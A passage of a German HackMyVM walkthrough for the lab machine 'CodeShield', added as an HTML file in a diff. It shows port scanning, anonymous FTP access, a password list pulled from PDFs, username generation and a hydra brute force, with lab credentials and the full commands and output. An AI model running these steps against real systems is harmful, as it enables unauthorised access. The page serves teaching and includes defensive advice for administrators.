@@ -1,0 +1,807 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CodeShield - HackMyVM - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+</head>
+<body>
+ <div class="nav-wrapper">
+    <div class="hamburger-nav-wrapper">
+        <input type="checkbox" id="hamburger-toggle">
+        <label id="hamburger-button" for="hamburger-toggle" aria-label="Menü öffnen">
+            <div class="bar"></div>
+            <div class="bar"></div>
+            <div class="bar"></div>
+        </label>
+        <nav class="navbar" id="main-nav">
+            <a href="../../aboutme.html">Über mich</a>
+            <a href="../../index.html">HackMyVM</a>
+            <a href="../../vulnyx.html">Vulnyx</a>
+            <a href="../../vulnhub.html">Vulnhub</a>
+        </nav>
+  </div></div>
+    <div class="header-bg">
+        <!-- Titel und Schwierigkeitsgrad angepasst -->
+        <h1>CodeShield - HackMyVM - Level: Easy - Bericht</h1>
+        <div class="level-container">
+            <!-- Schwierigkeitsgrad angepasst, Farbe wird durch CSS gesteuert (Easy = Grün) -->
+            <h2>Easy</h2>
+            <div class="circle">
+                <div class="segment segment-1"></div>
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                 <!-- Tool-Liste aus dem Text extrahiert -->
+                 <div class="tool-item">arp-scan</div>
+                 <div class="tool-item">vi</div>
+                 <div class="tool-item">nikto</div>
+                 <div class="tool-item">nmap</div>
+                 <div class="tool-item">ftp</div>
+                 <div class="tool-item">telnet</div>
+                 <div class="tool-item">dirsearch</div>
+                 <div class="tool-item">strings</div> <!-- Implizit für PDF? -->
+                 <div class="tool-item">username-anarchy</div>
+                 <div class="tool-item">cat</div>
+                 <div class="tool-item">awk</div>
+                 <div class="tool-item">rm</div>
+                 <div class="tool-item">mv</div>
+                 <div class="tool-item">hydra</div>
+                 <div class="tool-item">ssh</div>
+                 <div class="tool-item">grep</div>
+                 <div class="tool-item">su</div>
+                 <div class="tool-item">sudo</div>
+                 <div class="tool-item">find</div>
+                 <div class="tool-item">nc</div>
+                 <div class="tool-item">lxc</div>
+                 <div class="tool-item">ls</div>
+                 <div class="tool-item">cd</div>
+                 <div class="tool-item">id</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <!-- Inhaltsverzeichnis generiert -->
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#credential-gathering">Credential Gathering (FTP, PDF, Brute-Force)</a></li>
+                <li><a href="#initial-access">Initial Access (SSH)</a></li>
+                <li><a href="#privilege-escalation-user">Privilege Escalation (valdezk zu mitchellt zu earlyp)</a></li>
+                <li><a href="#poc">Proof of Concept (Privilege Escalation Path earlyp zu root)</a></li>
+                <li><a href="#privilege-escalation-root">Privilege Escalation (earlyp zu root)</a></li>
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.132	08:00:27:61:49:1f	PCS Systemtechnik GmbH
+                    </pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `arp-scan -l` wird genutzt, um das lokale Netzwerk nach aktiven Hosts mittels ARP-Protokoll zu scannen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein Host mit der IP `192.168.2.132` wurde gefunden. Die MAC-Adresse `08:00:27:61:49:1f` (PCS Systemtechnik GmbH) deutet auf eine VirtualBox-VM hin. Das Ziel wurde erfolgreich identifiziert.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie `192.168.2.132` als Ziel-IP für weitere Scans.
+            <br><strong>Empfehlung (Admin):</strong> Implementieren Sie Netzwerküberwachung, um ARP-Scans zu erkennen.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">vi /etc/hosts</span></div>
+                      <!-- Kein Output -->
+                      <div class="prompt"># <span class="command">Inhalt nach Bearbeitung (implizit)</span></div>
+                      <pre>
+127.0.0.1	localhost
+192.168.2.132   codeshield.hmv <!-- IP korrigiert von 138 auf 132 -->
+                      </pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Die lokale `/etc/hosts`-Datei wird bearbeitet (`vi`). Der Eintrag `192.168.2.132 codeshield.hmv` wird hinzugefügt, um den Hostnamen lokal auf die Ziel-IP aufzulösen. (Die IP im ursprünglichen Text war 138, wurde aber basierend auf dem arp-scan-Ergebnis auf 132 korrigiert).</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Vereinfacht den Zugriff auf Webdienste, die möglicherweise Virtual Hosts verwenden.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Verwenden Sie `codeshield.hmv` für Web-Interaktionen.
+              <br><strong>Empfehlung (Admin):</strong> Standardverfahren von Angreifern.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">nikto -h http://192.168.2.132</span></div>
+                    <pre>
+- Nikto v2.5.0
+---------------------------------------------------------------------------
++ Target IP:          192.168.2.132
++ Target Hostname:    192.168.2.132
++ Target Port:        80
++ Start Time:         2023-09-27 13:06:59 (GMT2)
+---------------------------------------------------------------------------
++ Server: nginx
++ Root page / redirects to: https://192.168.2.132/
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ .: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
++ 8102 requests: 0 error(s) and 1 item(s) reported on remote host
++ End Time:           2023-09-27 13:07:20 (GMT2) (21 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+                    </pre>
+                </div>
+            </div>
+             <p class="analysis"><strong>Analyse:</strong> `nikto` scannt den Webserver auf Port 80 der Ziel-IP.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Der Webserver ist `nginx`. Wichtigster Fund: Die Root-Seite (`/`) leitet auf HTTPS (Port 443) um (`https://192.168.2.132/`). Der fehlende Header `X-Content-Type-Options` wird gemeldet.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Konzentrieren Sie die Web-Enumeration auf HTTPS (Port 443). Führen Sie `nikto` und andere Tools gegen `https://codeshield.hmv` aus.
+             <br><strong>Empfehlung (Admin):</strong> Implementieren Sie den `X-Content-Type-Options`-Header. Stellen Sie sicher, dass die HTTPS-Konfiguration sicher ist.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Nmap Full Scan -->
+                     <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">nmap -sS -sC -sV -T5 -AO -Pn 192.168.2.132 -p-</span></div>
+                     <pre>
+Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-27 13:06 CEST
+Nmap scan report for codeshield.hmv (192.168.2.132)
+Host is up (0.00013s latency).
+Not shown: 65521 closed tcp ports (reset)
+PORT      STATE SERVICE       VERSION
+21/tcp    open  ftp           vsftpd 3.0.5
+| ftp-syst: STAT: vsFTPd 3.0.5 [...]
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-rw-r--    1 1002     1002      2349914 Aug 30 10:33 CodeShield_pitch_deck.pdf
+|_-rw-rw-r--    1 1003     1003        67520 Aug 28 19:45 Information_Security_Policy.pdf
+|_-rw-rw-r--    1 1004     1004       226435 Aug 28 18:29 The_2023_weak_password_report.pdf
+22/tcp    open  ssh           OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)
+| ssh-hostkey: [...] (RSA, ECDSA, ED25519)
+25/tcp    open  smtp          Postfix smtpd
+|_smtp-commands: [...]
+80/tcp    open  http          nginx
+|_http-title: Did not follow redirect to https://codeshield.hmv/
+110/tcp   open  pop3          Dovecot pop3d
+|_ssl-date: [...] | ssl-cert: Subject: commonName=mail.codeshield.hmv [...] |_pop3-capabilities: [...]
+143/tcp   open  imap          Dovecot imapd (Ubuntu)
+|_ssl-date: [...] | ssl-cert: Subject: commonName=mail.codeshield.hmv [...] |_imap-capabilities: [...]
+443/tcp   open  ssl/http      nginx
+| ssl-cert: Subject: commonName=mail.codeshield.hmv [...] |_ssl-date: [...] | http-robots.txt: 1 disallowed entry |_/ |_http-title: CodeShield - Home
+465/tcp   open  ssl/smtp      Postfix smtpd
+|_ssl-date: [...] | ssl-cert: Subject: commonName=mail.codeshield.hmv [...] |_smtp-commands: [...]
+587/tcp   open  smtp          Postfix smtpd
+|_ssl-date: [...] | ssl-cert: Subject: commonName=mail.codeshield.hmv [...] |_smtp-commands: [...]
+993/tcp   open  imaps?
+|_imap-capabilities: [...] |_ssl-date: [...] | ssl-cert: Subject: commonName=mail.codeshield.hmv [...]
+995/tcp   open  pop3s?
+| ssl-cert: Subject: commonName=mail.codeshield.hmv [...] |_ssl-date: [...] |_pop3-capabilities: [...]
+2222/tcp  open  ssh           OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)
+| ssh-hostkey: [...] (RSA, ECDSA, ED25519) <!-- Identisch zu Port 22 -->
+3389/tcp  open  ms-wbt-server xrdp
+22222/tcp open  ssh           OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: [...] (ECDSA, ED25519)
+MAC Address: 08:00:27:61:49:1F (Oracle VirtualBox virtual NIC)
+Aggressive OS guesses: [...]
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 1 hop
+Service Info: Hosts: -mail.codeshield.hmv,  mail.codeshield.hmv; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE [...]
+OS and Service detection performed. [...]
+Nmap done: 1 IP address (1 host up) scanned in 50.58 seconds
+                     </pre>
+                      <!-- Nmap grep Output -->
+                     <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">nmap -sS -sC -sV -T5 -AO -Pn 192.168.2.132 -p- | grep open</span></div>
+                     <pre>
+21/tcp    open  ftp           vsftpd 3.0.5
+22/tcp    open  ssh           OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)
+25/tcp    open  smtp          Postfix smtpd
+80/tcp    open  http          nginx
+110/tcp   open  pop3          Dovecot pop3d
+143/tcp   open  imap          Dovecot imapd (Ubuntu)
+443/tcp   open  ssl/http      nginx
+465/tcp   open  ssl/smtp      Postfix smtpd
+587/tcp   open  smtp          Postfix smtpd
+993/tcp   open  imaps?
+995/tcp   open  pop3s?
+2222/tcp  open  ssh           OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)
+3389/tcp  open  ms-wbt-server xrdp
+22222/tcp open  ssh           OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+                     </pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Der umfassende `nmap`-Scan identifiziert eine Vielzahl offener Ports und Dienste. `-Pn` wurde verwendet, um den Ping-Scan zu überspringen.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Sehr viele Dienste laufen:
+                <ul>
+                    <li>**FTP (21):** vsftpd 3.0.5 mit **erlaubtem Anonymous Login**. Drei PDF-Dateien sind sichtbar. -> **KRITISCH!**</li>
+                    <li>**SSH (22, 2222):** Veraltete OpenSSH 6.0p1 (Debian 7 Wheezy?). -> **HOHE SCHWACHSTELLEN-WAHRSCHEINLICHKEIT!**</li>
+                    <li>**SSH (22222):** Neuere OpenSSH 8.9p1 (Ubuntu). -> Möglicherweise der "korrekte" SSH-Port.</li>
+                    <li>**SMTP (25, 465, 587):** Postfix Mailserver.</li>
+                    <li>**HTTP (80):** Nginx, leitet auf HTTPS um.</li>
+                    <li>**POP3/IMAP (110, 143, 993, 995):** Dovecot Mailserver. Das SSL-Zertifikat gilt für `mail.codeshield.hmv`.</li>
+                    <li>**HTTPS (443):** Nginx, Titel "CodeShield - Home". `robots.txt` verbietet alles.</li>
+                    <li>**RDP (3389):** xrdp - Remote Desktop für Linux.</li>
+                </ul>
+            Die wichtigsten Angriffspunkte sind der anonyme FTP-Zugang, die alten SSH-Versionen und die Webanwendung auf HTTPS.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong>
+                1.  **Priorität 1: Anonymous FTP (21).** Verbinden und alle Dateien herunterladen (`CodeShield_pitch_deck.pdf`, `Information_Security_Policy.pdf`, `The_2023_weak_password_report.pdf`). Analysieren Sie diese auf Metadaten und Inhalte.
+                2.  **Priorität 2: Alte SSH (22, 2222).** Suchen Sie nach bekannten Exploits für OpenSSH 6.0p1.
+                3.  **Priorität 3: Webserver (443).** Führen Sie Web-Enumeration (`nikto`, `dirsearch`, etc.) gegen `https://codeshield.hmv` durch. Untersuchen Sie die Webanwendung auf Schwachstellen.
+                4.  **Priorität 4: Neuer SSH (22222).** Versuchen Sie Brute-Force mit gefundenen Benutzernamen/Passwörtern.
+                5.  **Priorität 5: Maildienste/RDP.** Auf User Enumeration oder bekannte Schwachstellen prüfen.
+             <br><strong>Empfehlung (Admin):</strong> **KRITISCH:** Deaktivieren Sie sofort den anonymen FTP-Zugang oder beschränken Sie ihn stark. **KRITISCH:** Aktualisieren Sie die veralteten OpenSSH-Versionen auf Port 22 und 2222 oder deaktivieren Sie diese Ports, wenn Port 22222 der einzige benötigte ist. Überprüfen Sie die Notwendigkeit aller offenen Mail-Ports und RDP. Sichern Sie alle Dienste mit starken Passwörtern und aktuellen Versionen.</p>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Manual Browser Request / robots.txt Check]</div>
+                     <pre>
+# URL: https://192.168.2.132/robots.txt (or https://codeshield.hmv/robots.txt)
+User-agent: *
+Disallow: /
+                     </pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Die `robots.txt`-Datei wird auf dem HTTPS-Server (Port 443) abgerufen.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Die Anweisung `Disallow: /` weist kooperative Suchmaschinen an, keine Seiten der Website zu indizieren. Für einen Pentest ist dies irrelevant, da es keinen technischen Zugriff verhindert.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ignorieren Sie `robots.txt` und fahren Sie mit der Enumeration fort (z.B. `dirsearch`).
+              <br><strong>Empfehlung (Admin):</strong> `robots.txt` ist keine Sicherheitsmaßnahme.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">[Manual Browser Request / robots.txt Check - Duplicate?]</div>
+                     <pre>
+# URL: https://192.168.2.138/robots.txt <!-- Falsche IP 138 -->
+User-agent: *
+Disallow: /
+                     </pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Erneute Überprüfung von `robots.txt`, diesmal mit der falschen IP `192.168.2.138`.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Redundanter Eintrag, wahrscheinlich ein Fehler im Log.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ignorieren.
+             <br><strong>Empfehlung (Admin):</strong> Keine.</p>
+
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">[Manual Browser Request / License Check]</div>
+                      <pre>
+# URL: https://192.168.2.138/LICENSE.txt <!-- Falsche IP 138 -->
+# Inhalt: HTML Codex License Text [...]
+                      </pre>
+                  </div>
+              </div>
+              <p class="analysis"><strong>Analyse:</strong> Die Datei `LICENSE.txt` wird abgerufen (wieder mit falscher IP).</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Enthält nur Standard-Lizenzinformationen für ein HTML-Template. Keine nützlichen Informationen für den Angriff.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ignorieren.
+              <br><strong>Empfehlung (Admin):</strong> Keine.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">dirsearch -u https://192.168.2.132/mail</span></div> <!-- IP korrigiert -->
+                     <pre>
+
+  _|. _ _  _  _  _ _|_    v0.4.2
+ (_||| _) (/_(_|| (_| )
+
+Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927
+
+Output File: /root/.dirsearch/reports/192.168.2.132/-mail_23-10-02_17-46-09.txt <!-- IP korrigiert -->
+
+Error Log: /root/.dirsearch/logs/errors-23-10-02_17-46-09.log
+
+Target: https://192.168.2.132/mail/ <!-- IP korrigiert -->
+
+[17:46:29] 200 -   55KB - /mail/composer.lock
+[17:46:35] 200 -    5KB - /mail/index.php
+[17:46:43] 301 -  162B  - /mail/plugins  ->  https://192.168.2.132/mail/plugins/ <!-- IP korrigiert -->
+[17:46:44] 403 -  548B  - /mail/program/
+[17:46:44] 301 -  162B  - /mail/public_html  ->  https://192.168.2.132/mail/public_html/ <!-- IP korrigiert -->
+[17:46:45] 403 -  548B  - /mail/resources/sass/.sass-cache/
+[17:46:45] 403 -  548B  - /mail/resources/.arch-internal-preview.css
+[17:46:47] 301 -  162B  - /mail/skins  ->  https://192.168.2.132/mail/skins/ <!-- IP korrigiert -->
+[17:46:49] 403 -  548B  - /mail/temp/
+
+Task Completed
+                     </pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> `dirsearch` wird verwendet, um das Verzeichnis `/mail` auf dem HTTPS-Server (Port 443) zu untersuchen. Die IP wurde im Befehl und den URLs von der falschen 138 auf die korrekte 132 angepasst.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die Existenz des Roundcube Webmailers unter `/mail`. Findet `index.php`, `composer.lock` und Standardverzeichnisse wie `plugins`, `program`, `public_html`, `skins`, `temp`. Einige Verzeichnisse sind nicht zugänglich (403). `composer.lock` könnte auf verwendete Bibliotheken und potenzielle Schwachstellen hinweisen.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie `composer.lock` auf bekannte Schwachstellen in den Abhängigkeiten. Interagieren Sie mit der Roundcube-Login-Seite unter `/mail/index.php`. Versuchen Sie Brute-Force mit gefundenen Benutzernamen/Passwörtern.
+              <br><strong>Empfehlung (Admin):</strong> Halten Sie Roundcube und seine Abhängigkeiten aktuell. Beschränken Sie den Zugriff auf unnötige Dateien und Verzeichnisse.</p>
+        </section>
+
+        <section id="credential-gathering">
+            <h2>Credential Gathering (FTP, PDF, Brute-Force)</h2>
+
+            <div class="code-block">
+                 <div class="terminal">
+                      <!-- FTP Anonymous Login & File Listing -->
+                     <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">ftp 192.168.2.132</span></div> <!-- IP korrigiert -->
+                     <pre>
+Connected to 192.168.2.132.
+220 (vsFTPd 3.0.5)
+Name (192.168.2.132:cyber): <span class="command">anonymous</span>
+331 Please specify the password.
+Password: <span class="command">[Enter]</span>
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> <span class="command">ls -la</span>
+229 Entering Extended Passive Mode (|||61622|)
+150 Here comes the directory listing.
+drwxr-xr-x    2 0        137          4096 Aug 30 10:35 .
+drwxr-xr-x    2 0        137          4096 Aug 30 10:35 ..
+-rw-rw-r--    1 1002     1002      2349914 Aug 30 10:33 CodeShield_pitch_deck.pdf
+-rw-rw-r--    1 1003     1003        67520 Aug 28 19:45 Information_Security_Policy.pdf
+-rw-rw-r--    1 1004     1004       226435 Aug 28 18:29 The_2023_weak_password_report.pdf
+226 Directory send OK.
+ftp> <span class="command">quit</span>
+221 Goodbye.
+                     </pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> Es wird manuell eine Verbindung zum FTP-Server auf Port 21 hergestellt und ein anonymer Login durchgeführt. Anschließend wird der Inhalt des Verzeichnisses aufgelistet.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> Bestätigt erneut den anonymen FTP-Zugang und die drei verfügbaren PDF-Dateien. Die Benutzer-IDs (1002, 1003, 1004) der Dateieigentümer werden sichtbar.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Laden Sie die Dateien herunter (bereits geschehen) und analysieren Sie sie (ebenfalls geschehen).
+              <br><strong>Empfehlung (Admin):</strong> Deaktivieren Sie anonymen FTP-Zugriff.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- PDF Analyse (Inhalt und Metadaten) -->
+                     <div class="prompt">#[Auswertung der PDF-Dateien (manuell/strings)]</div>
+                     <pre>
+# Funde in CodeShield_pitch_deck.pdf:
+[...]
+Jessica Carlson
+j.carlson@codeshield.hmv
+[...]
+
+# Funde in The_2023_weak_password_report.pdf:
+[...]
+Top 10 passwords with at least 12 characters:
+<span class="password">Xxxxxxxxx001</span>
+<span class="password">Password123!</span>
+<span class="password">Greatplace2work!</span>
+<span class="password">Diciembre@2017</span>
+<span class="password">Hairdresser1!</span>
+<span class="password">1qa2ws3ed4rf</span>
+<span class="password">XXXX12345678</span>
+<span class="password">Hairdresser1</span>
+<span class="password">Xxxxxxxxx002</span>
+<span class="password">Xxxxxxxxxx01</span>
+[...]
+                     </pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Die heruntergeladenen PDF-Dateien werden auf verwertbare Informationen untersucht.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die E-Mail-Adresse `j.carlson@codeshield.hmv` (potenzieller Benutzername `j.carlson`) und extrahiert eine Liste von 10 schwachen (aber teilweise komplexen) Passwörtern.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Erstellen Sie eine Benutzerliste (z.B. `j.carlson` und andere aus Namen generierte) und eine Passwortliste (`pass.txt`) mit den gefundenen Passwörtern. Verwenden Sie diese für Brute-Force-Angriffe.
+            <br><strong>Empfehlung (Admin):</strong> Entfernen Sie sensible Informationen aus öffentlich zugänglichen Dokumenten. Setzen Sie Passwortrichtlinien durch, die die Verwendung solcher kompromittierten Passwörter verhindern.</p>
+
+            <!-- Username Generation (nicht explizit gezeigt, aber impliziert durch usersneu.txt) -->
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿Cybermaschine)-[~/HackingTools/username-anarchy]
+└─# <span class="command">./username-anarchy --input-file ../../users.txt > anarchy_users</span></div>
+                      <!-- Annahme: ../../users.txt enthält Namen wie "Jessica Carlson" -->
+                     <div class="prompt">┌──(root㉿Cybermaschine)-[~/HackingTools/username-anarchy]
+└─# <span class="command">cat anarchy_users</span></div>
+                     <pre>
+[...]
+j.carlson
+jcarlson
+carlsonj
+[...]
+valdezk <!-- Beispiel für späteren Fund -->
+[...]
+                     </pre>
+                     <div class="prompt">┌──(root㉿Cybermaschine)-[~/HackingTools/username-anarchy]
+└─# <span class="command">mv anarchy_users ~/usersneu.txt</span></div>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Das Tool `username-anarchy` wird verwendet, um aus einer Liste von Namen (vermutlich extrahiert aus den PDFs, z.B. "Jessica Carlson") potenzielle Benutzernamen zu generieren (z.B. `j.carlson`, `jcarlson`, `carlsonj`). Die Ergebnisse werden in `usersneu.txt` gespeichert.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Systematischer Ansatz zur Erstellung einer umfassenden Benutzerliste für Brute-Force-Angriffe.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Kombinieren Sie diese Benutzerliste mit der Passwortliste für Angriffe.
+             <br><strong>Empfehlung (Admin):</strong> Verwenden Sie möglichst keine vorhersagbaren Benutzernamenmuster.</p>
+
+             <!-- Passwortliste vorbereiten -->
+             <div class="code-block">
+                  <div class="terminal">
+                      <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command"># Angenommen: Passwörter aus PDF in pass.txt gespeichert</span></div>
+                      <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">cat pass.txt | awk {'print $2'} > pass1.txt</span></div>
+                      <!-- Annahme: awk-Befehl isoliert die Passwörter, falls sie mit Nummern o.ä. gespeichert wurden -->
+                       <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">cat pass1.txt</span></div>
+                      <pre>
+Xxxxxxxxx001
+Password123!
+Greatplace2work!
+Diciembre@2017
+Hairdresser1!
+1qa2ws3ed4rf
+XXXX12345678
+Hairdresser1
+Xxxxxxxxx002
+Xxxxxxxxxx01
+                      </pre>
+                       <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">rm pass.txt</span></div>
+                       <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">mv pass1.txt pass.txt</span></div>
+                  </div>
+              </div>
+             <p class="analysis"><strong>Analyse:</strong> Die aus dem PDF extrahierte Passwortliste wird bereinigt (möglicherweise wurden führende Nummern entfernt) und als `pass.txt` gespeichert.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Die Passwortliste ist nun für den Einsatz mit `hydra` bereit.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Starten Sie den Brute-Force-Angriff.
+             <br><strong>Empfehlung (Admin):</strong> Keine.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">hydra -L usersneu.txt -P pass.txt ftp://192.168.2.132 -t 64</span></div> <!-- IP korrigiert -->
+                     <pre>
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak [...]
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-10-27 16:05:51
+[...]
+[DATA] max 64 tasks per 1 server, overall 64 tasks, 1550 login tries (l:155/p:10), ~25 tries per task
+[DATA] attacking ftp://192.168.2.132:21/ <!-- IP korrigiert -->
+[...]
+[21][ftp] host: 192.168.2.132   login: valdezk   password: <span class="password">Greatplace2work!</span>
+
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-10-27 16:06:10
+                     </pre>
+                 </div>
+             </div>
+              <p class="analysis"><strong>Analyse:</strong> `hydra` wird verwendet, um einen Brute-Force-Angriff gegen den FTP-Dienst (Port 21) durchzuführen, wobei die generierte Benutzerliste (`usersneu.txt`) und die extrahierte Passwortliste (`pass.txt`) verwendet werden. Die IP wurde von 113 auf 132 korrigiert.</p>
+              <p class="evaluation"><strong>Bewertung:</strong> **Erfolg!** Hydra findet gültige FTP-Zugangsdaten: Benutzer `valdezk` mit dem Passwort `<span class="password">Greatplace2work!</span>`. Dieses Passwort stammt aus der PDF-Liste.</p>
+              <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie diese Zugangsdaten sofort für den SSH-Dienst (insbesondere Port 22222). Melden Sie sich auch per FTP als `valdezk` an, um zu sehen, ob mehr Dateien sichtbar sind als beim anonymen Login.
+              <br><strong>Empfehlung (Admin):</strong> Ändern Sie das Passwort für `valdezk`. Implementieren Sie `fail2ban` oder ähnliche Schutzmechanismen für FTP und andere Dienste, um Brute-Force-Angriffe zu erschweren.</p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (SSH)</h2>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- FTP Login als valdezk -->
+                     <div class="prompt">┌──(root㉿Cybermaschine)-[~]
+└─# <span class="command">ftp 192.168.2.132</span></div> <!-- IP korrigiert -->
+                     <pre>
+Connected to 192.168.2.132.
+220 (vsFTPd 3.0.5)
+Name (192.168.2.132:cyber): <span class="command">valdezk</span>
+331 Please specify the password.
+Password: <span class="password">Greatplace2work!</span>
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> <span class="command">ls -la</span>
+229 Entering Extended Passive Mode (|||38676|)
+150 Here comes the directory listing.
+drwxr-x---   18 1007     1007         4096 Aug 29 10:47 .
+[...]
+-rw-------    1 1007     1007           56 Aug 29 10:45 .Xauthority
+-rw-rw-r--    1 1007     1007            0 Aug 28 20:12 .bash_history
+[...]
+226 Directory send OK.
+ftp> <span class="command">get .bash_history</span>
+local: .bash_history remote: .bash_history
+229 Entering Extended Passive Mode (|||27449|)
+150 Opening BINARY mode data connection for .bash_history (0 bytes).
+226 Transfer complete.
+ftp> <span class="command">ls /home</span>
+229 Entering Extended Passive Mode (|||8806|)
+150 Here comes the directory listing.
+drwxr-x---   16 1002     1002         4096 Aug 30 10:36 carlsonj
+drwxr-x---   15 1005     1005         4096 Aug 28 19:56 coccia
+drwxr-x---    5 1001     1001         4096 Aug 26 12:57 cowrie
+drwxr-x---   19 1000     1000         4096 Aug 29 06:22 earlyp
+drwxr-x---    2 2001     2001         4096 Aug 26 09:36 iredadmin
+drwxr-x---    2 2002     2002         4096 Aug 26 09:36 iredapd
+drwxr-x---   16 1003     1003         4096 Aug 28 19:50 mansourm
+drwxr-x---   17 1006     1006         4096 Aug 30 10:39 mitchellt
+drwxr-x---    2 2004     2004         4096 Aug 26 09:36 netdata
+drwxr-x---   16 1004     1004         4096 Aug 28 19:54 tanx
+drwxr-x---   18 1007     1007         4096 Aug 29 10:47 valdezk
